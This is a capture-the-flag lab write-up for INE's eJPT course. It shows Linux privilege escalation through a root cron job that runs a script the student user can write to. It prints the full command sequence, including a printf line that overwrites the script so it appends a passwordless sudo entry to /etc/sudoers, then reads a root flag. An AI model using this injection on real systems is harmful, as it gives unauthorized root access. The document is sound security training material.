# Linux Privilege Escalation via Misconfigured Cron Job - INE eJPT

INE privilege escalation lab. Initial access as `student` through a browser-based terminal. A root cron job runs a script that `student` can write to. Overwriting the script injects a sudoers entry, and the next cron execution grants passwordless sudo.

Target: `target.ine.local` (web terminal on port 8000)

---

## Reconnaissance

```bash
ping -c 4 target.ine.local
```

Navigate to `http://target.ine.local:8000` - browser-accessible Linux terminal, logged in as `student`.

---

## Enumeration

```bash
ls -l
```

A file named `message` is present in the home directory but readable only by root.

```bash
find / -name message 2>/dev/null
```

File `/tmp/message` found.

```bash
ls -l /tmp/
```

`/tmp/message` is overwritten every minute - a cron job or automated script is running as root.

### Finding the Script

```bash
grep -nri "/tmp/message" /usr 2>/dev/null
```

Script identified: `/usr/local/share/copy.sh`

```bash
ls -l /usr/local/share/copy.sh
cat /usr/local/share/copy.sh
```

The script is writable by `student` and is executed by root via cron. This is the vulnerability.

---

## Exploitation

No text editor is available. Use `printf` to overwrite the script:

```bash
printf '#! /bin/bash\necho "student ALL=NOPASSWD:ALL" >> /etc/sudoers' > /usr/local/share/copy.sh
```

Wait approximately one minute for the cron job to execute.

```bash
sudo -l
```

Output confirms `student` can now run any command as root without a password.

---

## Privilege Escalation

```bash
sudo su
whoami
```

```
root
```

```bash
cd /root
ls -l
cat flag
```

```
697914df7a07bb9b718c8ed258150164
```

---

## Key Takeaways

- A cron job running as root with a script writable by a low-privilege user is a direct privilege escalation path. No exploit or CVE required.
- The detection method is `grep -nri "<suspected_path>" /usr` - searching for the string that appears in automatically regenerated files reveals the script responsible.
- `printf` bypasses the requirement for a text editor when modifying files. The `\n` escape injects a newline, enabling multi-line script injection.
- Appending to `/etc/sudoers` rather than replacing it avoids breaking existing sudo rules - a more stable injection.
- The enumeration sequence for Linux PrivEsc: `crontab -l`, `cat /etc/crontab`, `ls -la /etc/cron*`, then `find / -perm -4000 -type f 2>/dev/null` for SUID binaries.

---

## Disclaimer

This lab was completed in a controlled environment provided by INE as part of the eJPT preparation path. All actions were performed strictly for educational purposes.
